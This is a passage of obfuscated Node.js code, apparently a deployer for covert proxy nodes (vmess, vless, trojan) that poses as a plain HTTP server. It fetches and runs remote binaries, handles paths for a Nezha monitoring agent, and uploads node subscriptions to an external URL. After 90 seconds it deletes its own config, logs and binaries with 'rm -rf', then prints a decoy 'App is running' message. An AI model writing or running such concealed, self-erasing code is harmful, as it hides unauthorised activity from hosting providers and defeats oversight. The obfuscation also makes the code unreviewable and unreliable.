_0x20c3ca=_0x3481,_0x6c37c0={'v':'2','ps':''+_0x62f366,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x20c3ca(0x1a8),'net':'ws','type':_0x20c3ca(_0x3f191c._0x58cba2),'host':_0x35a976,'path':_0x20c3ca(_0x3f191c._0x2c82ea),'tls':_0x20c3ca(_0x3f191c._0x54878a),'sni':_0x35a976,'alpn':'','fp':'firefox'},_0x3ff73f=_0x20c3ca(0x1b1)+UUID+'@'+CFIP+':'+CFPORT+_0x20c3ca(0x161)+_0x35a976+_0x20c3ca(0x165)+_0x35a976+_0x20c3ca(_0x3f191c._0x2c2da3)+_0x62f366+_0x20c3ca(_0x3f191c._0x4c5453)+Buffer[_0x20c3ca(_0x3f191c._0x4e1236)](JSON[_0x20c3ca(_0x3f191c._0x41d629)](_0x6c37c0))[_0x20c3ca(0x1c4)](_0x20c3ca(0x168))+_0x20c3ca(_0x3f191c._0x55fd40)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x35a976+_0x20c3ca(0x165)+_0x35a976+_0x20c3ca(_0x3f191c._0x2f9fca)+_0x62f366+_0x20c3ca(0x17e);console[_0x20c3ca(_0x3f191c._0x901aed)](Buffer[_0x20c3ca(_0x3f191c._0x51f92f)](_0x3ff73f)[_0x20c3ca(0x1c4)](_0x20c3ca(0x168))),fs['writeFileSync'](subPath,Buffer[_0x20c3ca(_0x3f191c._0x51f92f)](_0x3ff73f)[_0x20c3ca(0x1c4)]('base64')),console['log'](FILE_PATH+_0x20c3ca(0x1b7)),uploadNodes(),app[_0x20c3ca(0x1b5)]('/'+SUB_PATH,(_0x262728,_0xb78e5a)=>{const _0x2f0101=_0x20c3ca,_0x26ea6f=Buffer[_0x2f0101(_0x30bbba._0x36f69d)](_0x3ff73f)[_0x2f0101(0x1c4)]('base64');_0xb78e5a[_0x2f0101(0x13c)](_0x2f0101(_0x30bbba._0x399440),_0x2f0101(0x178)),_0xb78e5a[_0x2f0101(_0x30bbba._0x25fd23)](_0x26ea6f);}),_0x2d8c90(_0x3ff73f);},0x7d0);});}}async function uploadNodes(){const _0x37f744={_0x2fcaaa:0x1ce,_0x32cc98:0x17b,_0x305d53:0x183,_0x454645:0x1a5,_0x2b79b2:0x133,_0x3700ae:0x1e5,_0x47f3b3:0x1e4},_0x4fa0d1=_0x13da4e;if(UPLOAD_URL&&PROJECT_URL){const _0x10a6f9=PROJECT_URL+'/'+SUB_PATH,_0x4b48e9={'subscription':[_0x10a6f9]};try{const _0xf13b58=await axios[_0x4fa0d1(_0x37f744._0x2fcaaa)](UPLOAD_URL+'/api/add-subscriptions',_0x4b48e9,{'headers':{'Content-Type':'application/json'}});return _0xf13b58&&_0xf13b58[_0x4fa0d1(0x1e4)]===0xc8?(console[_0x4fa0d1(_0x37f744._0x32cc98)](_0x4fa0d1(0x158)),_0xf13b58):null;}catch(_0x578e35){if(_0x578e35[_0x4fa0d1(_0x37f744._0x305d53)]){if(_0x578e35[_0x4fa0d1(_0x37f744._0x305d53)][_0x4fa0d1(0x1e4)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4fa0d1(0x1d4)](listPath))return;const _0x2577bb=fs[_0x4fa0d1(_0x37f744._0x454645)](listPath,_0x4fa0d1(_0x37f744._0x2b79b2)),_0x3ba340=_0x2577bb['split']('\x0a')[_0x4fa0d1(0x1bf)](_0x451018=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x451018));if(_0x3ba340[_0x4fa0d1(0x140)]===0x0)return;const _0x37d24e=JSON['stringify']({'nodes':_0x3ba340});try{const _0x455aa1=await axios[_0x4fa0d1(_0x37f744._0x2fcaaa)](UPLOAD_URL+_0x4fa0d1(_0x37f744._0x3700ae),_0x37d24e,{'headers':{'Content-Type':_0x4fa0d1(0x1d3)}});return _0x455aa1&&_0x455aa1[_0x4fa0d1(_0x37f744._0x47f3b3)]===0xc8?(console[_0x4fa0d1(0x17b)](_0x4fa0d1(0x13d)),_0x455aa1):null;}catch(_0x55a7a1){return null;}}else return;}}function cleanFiles(){const _0x3099b4={_0x3f3f14:0x189,_0x43a95e:0x148,_0x46f309:0x19d},_0x3b4f82={_0x1aca1d:0x1c8,_0x5bee60:0x17b,_0x21a38d:0x19b};setTimeout(()=>{const _0x5b8133={_0xb13401:0x19b},_0x5d39e2=_0x3481,_0x52c516=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x52c516[_0x5d39e2(_0x3099b4._0x3f3f14)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x52c516['push'](phpPath);process[_0x5d39e2(0x1b9)]==='win32'?exec(_0x5d39e2(_0x3099b4._0x43a95e)+_0x52c516[_0x5d39e2(0x1d6)]('\x20')+'\x20>\x20nul\x202>&1',_0x1987de=>{const _0x2b7bc3=_0x5d39e2;console[_0x2b7bc3(_0x3b4f82._0x1aca1d)](),console[_0x2b7bc3(0x17b)]('App\x20is\x20running'),console[_0x2b7bc3(_0x3b4f82._0x5bee60)](_0x2b7bc3(_0x3b4f82._0x21a38d));}):exec('rm\x20-rf\x20'+_0x52c516[_0x5d39e2(0x1d6)]('\x20')+_0x5d39e2(_0x3099b4._0x46f309),_0x126a84=>{const _0x16663f=_0x5d39e2;console[_0x16663f(0x1c8)](),console[_0x16663f(0x17b)]('App\x20is\x20running'),console['log'](_0x16663f(_0x5b8133._0xb13401));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4d5fbb={_0x591dc4:0x199,_0x573161:0x1ad,_0x3aaa12:0x1d3,_0x2af1ba:0x167},_0x3d6fdb=_0x13da4e;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3d6fdb(0x17b)](_0x3d6fdb(_0x4d5fbb._0x591dc4));return;}try{const _0x49754c=await axios['post'](_0x3d6fdb(_0x4d5fbb._0x573161),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3d6fdb(_0x4d5fbb._0x3aaa12)}});return console[_0x3d6fdb(0x17b)]('automatic\x20access\x20task\x20added\x20successfully'),_0x49754c;}catch(_0x3c1cc5){return console[_0x3d6fdb(0x135)](_0x3d6fdb(_0x4d5fbb._0x2af1ba)+_0x3c1cc5[_0x3d6fdb(0x1db)]),null;}}function _0x3481(_0x303a50,_0x29b952){const _0x4e9e69=_0x4e9e();return _0x3481=function(_0x3481b6,_0xb8e392){_0x3481b6=_0x3481b6-0x133;let _0x2e83ed=_0x4e9e69[_0x3481b6];return _0x2e83ed;},_0x3481(_0x303a50,_0x29b952);}async function startserver(){const _0x4c16db={_0x42b0b8:0x17f},_0x36a97d=_0x13da4e;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4a886f){console['error'](_0x36a97d(_0x4c16db._0x42b0b8),_0x4a886f);}}startserver()[_0x13da4e(0x1d5)](_0x1bb8a6=>{const _0x5e71c0=_0x13da4e;console[_0x5e71c0(0x135)]('Unhandled\x20error\x20in\x20startserver:',_0x1bb8a6);}),app['listen'](PORT,()=>console[_0x13da4e(0x17b)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
